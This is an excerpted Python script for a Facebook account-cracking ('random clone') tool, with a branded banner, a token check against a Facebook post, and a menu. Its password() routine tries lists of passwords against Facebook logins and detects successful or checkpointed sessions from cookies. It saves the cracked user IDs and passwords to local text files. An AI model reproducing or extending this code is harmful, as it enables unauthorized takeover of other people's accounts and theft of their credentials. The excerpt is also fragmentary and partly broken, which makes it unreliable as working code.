...
ha = current.day
today = date.today()
FOYSAL2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
if ltx > 12:
    ...
    tag = "AM"
logo =f"""\033[1;32m
d88888b  .d88b.  db    db .d8888.  .d8b.  db      
88'     .8P  Y8. `8b  d8' 88'  YP d8' `8b 88      
88ooo   88    88  `8bd8'  `8bo.   88ooo88 88      
88~~~   88    88    88      `Y8b. 88~~~88 88      
88      `8b  d8'    88    db   8D 88   88 88booo. 
YP       `Y88P'     YP    `8888Y' YP   YP Y88888P 
                                                                                            
\033[1;37m╔ⒽⒷⒻ═════════════════\033[1;33mT.K.S✯𝐓𝐄𝐀𝐌\033[1;37m══════════════ⒽⒷⒻ╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32Mohammad Foysal     \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mFOYSAL HOSEN\033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝐇𝐚𝐦𝐢𝐢-𝐤𝐢𝐧𝐠-𝟎𝟔             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+8801793268786            \033[1;31m │
...
\033[1;37m╚ⒽⒷⒻFACEBOOK TRICKS AND HELPING ZONE{ T.K S }\033[1;37mTKS╝
\033[1;91m==========================================================
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mTKS-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mTKS-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print("\t  Fb page  : FOYSAL HOSEN ")
    print("\t  Github   : FOYSAL-404")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    my_server=requests.get("https://www.facebook.com/100000424571603/posts/pfbid02ZG78gghaeEdjhr1Vo6MyvoHcPZkrCZcpH3ycnoEsswzLdVF5aZ8GueSYoHZxazael/?app=fbl").text
    if f_token in my_server:
        xyz()
    else:
        _help=uuid.uuid1().hex[:6].upper()+"=TKS"
        print("\n\t     [ Hello User ]\n")
        ...
        print(" otherwise msg on this whatsapp 01793268786 \n")
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_FOYSAL_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if FOYSAL in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/FOYSAL.OFFICIALS.ACCOUNT0075");xyz()
    elif FOYSAL in ["4","04"]:
        os.system("xdg-open https://wa.me/+8801793268786")
        xyz()    
    elif FOYSAL in ["0","00"]:
       exit()
    else:
...
def password():
    ...
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{FOYSAL2} : ")
    if passX in ['1','01']:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[FOYSAL-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio FOYSAL_2F.mp3")
                    print('\r\033[1;34m[FOYSAL-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/FOYSAL-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio FOYSAL_CP.mp3")
                    print(f'\r\033[1;30m[FOYSAL-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[FOYSAL 🔥] [%s] \33[1;97m[OK:%s{FOYSAL2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
